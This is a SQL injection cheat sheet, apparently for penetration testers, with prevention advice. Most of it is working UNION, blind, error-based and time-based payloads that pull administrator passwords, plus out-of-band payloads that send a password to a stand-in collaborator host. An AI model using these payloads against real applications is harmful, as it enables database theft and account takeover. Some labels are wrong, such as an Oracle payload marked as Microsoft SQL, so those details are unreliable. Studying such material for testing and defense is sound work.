# SQL Injection

## Overview

SQL Injection (SQLi) is a code injection technique that exploits vulnerabilities in an application's database layer. It occurs when user-supplied input is concatenated directly into SQL queries without proper sanitization or parameterization. Attackers can manipulate queries to read, modify, or delete data, bypass authentication, or execute administrative operations on the database.

**Important Warning:** Be extremely careful with broad conditions like `OR 1=1`. The same input may be used in multiple queries (including UPDATE or DELETE), which can cause accidental data loss or corruption.

## Attack Surface

- Login forms and authentication mechanisms
- Search functionality
- Filters, sorting, and pagination parameters
- Any database-backed feature that accepts user input (comments, profiles, product lookups, etc.)
- XML or JSON inputs that are later used in SQL queries (second-order)

## Identification

- Inject a single quote `'` and look for database errors, different responses, or anomalies.
- Use comment sequences to truncate queries: `-- ` (note the space for MySQL) or `#`.
- Test time-based conditions or OAST (out-of-band) to detect blind injection.
- Observe differences in application behavior for TRUE vs FALSE conditions in blind scenarios.
- Check error messages when syntax is valid vs invalid.

## Exploitation

### Login Bypass

Simple authentication bypass:
```
administrator'--
```

### UNION-Based SQLi

**Determine number of columns:**
```sql
' ORDER BY 1--
' ORDER BY 2--
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
```

**Oracle note:** Requires `FROM` clause:
```sql
' UNION SELECT NULL FROM DUAL--
```

**Finding useful columns:**
```sql
' UNION SELECT 'a',NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL--
```

**Retrieving data:**
```sql
' UNION SELECT username, password, NULL FROM users--
' UNION SELECT username || '~' || password FROM users--
```

**Database enumeration:**
- Version: `' UNION SELECT @@version--`
- Tables: `SELECT * FROM information_schema.tables`
- Columns: `SELECT * FROM information_schema.columns WHERE table_name = 'Users'`

### Blind SQLi

**Detection:**
```sql
' AND '1'='1
' AND '1'='2
```

**Exploitation (length and char extraction):**
```sql
' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>2)='a
' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm
' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 'm
```

### Error-Based SQLi

Trigger errors to leak data:
```sql
xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
```

MySQL example:
```sql
xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a
```

Oracle:
```sql
TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>2 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||' --
```

CAST technique:
```sql
' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
```

### Time-Based Blind

**Detection:**
```sql
'; IF (1=1) WAITFOR DELAY '0:0:10'--
```

**Exploitation:**
```sql
'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:10'--
```

Postgres:
```sql
%3BSELECT CASE WHEN ((SELECT COUNT(username) FROM users WHERE username = 'administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1) THEN pg_sleep(10) ELSE pg_sleep(0) END--
```

### OAST (Out-of-Band) Techniques

Trigger DNS/HTTP callbacks to confirm and exfiltrate:
- Microsoft SQL: `'; exec master..xp_dirtree '//collaborator.example.com/a'--`
- More advanced UNION + XML extraction for data exfil.

Example for password exfil:
```sql
'; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');exec('master..xp_dirtree "//'+@p+'.collaborator.net/a"')--
```

### Other Techniques

- Bypass filters using XML or encoded payloads (e.g., `&#x55;NION`).
- Second-order SQLi: injection is stored and executed later in a different context.

## Impact

- Complete database compromise (read all data)
- Authentication bypass and account takeover
- Data modification or destruction
- Execution of administrative database commands
- In some cases, operating system command execution via database features (xp_cmdshell, etc.)

## Prevention

- Use **parameterized queries** (prepared statements) exclusively. Never concatenate user input into SQL strings.

Vulnerable (string concatenation):
```js
String query = "SELECT * FROM products WHERE category = '"+ input + "'";
Statement statement = connection.createStatement();
```

Safe:
```js
PreparedStatement statement = connection.prepareStatement("SELECT * FROM products WHERE category = ?");
statement.setString(1, input);
```

- When parameterized queries cannot be used (column names, ORDER BY), implement strict whitelisting of allowed values.
- Apply the principle of least privilege to database accounts.
- Use ORM frameworks carefully (many still allow raw queries).
- Input validation as a defense-in-depth layer, not the primary control.
- Web Application Firewalls (WAF) as an additional control.

## Tools & Payloads

- Burp Suite (manual testing + Intruder for automation)
- sqlmap for automated detection and exploitation
- Custom scripts for specific blind or OAST scenarios

**Common cheat sheet reference:** PortSwigger SQL Injection Cheat Sheet

### SQLMap Essentials

SQLMap supports multiple techniques (BEUSTQ by default):
- B: Boolean-based blind
- E: Error-based
- U: Union-based
- S: Stacked queries
- T: Time-based blind
- Q: Inline queries

Basic usage targets parameters. Use `--cookie`, headers, or `*` marker for custom injection points.

Example techniques and when to use them are detailed below. Run with `-h` or consult the wiki for full options.

**Example OAST Microsoft SQL payload (URL encoded as needed):**
```sql
'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//collaborator.example.com/">+%25remote%3b]>'),'/l')+FROM+dual--
```
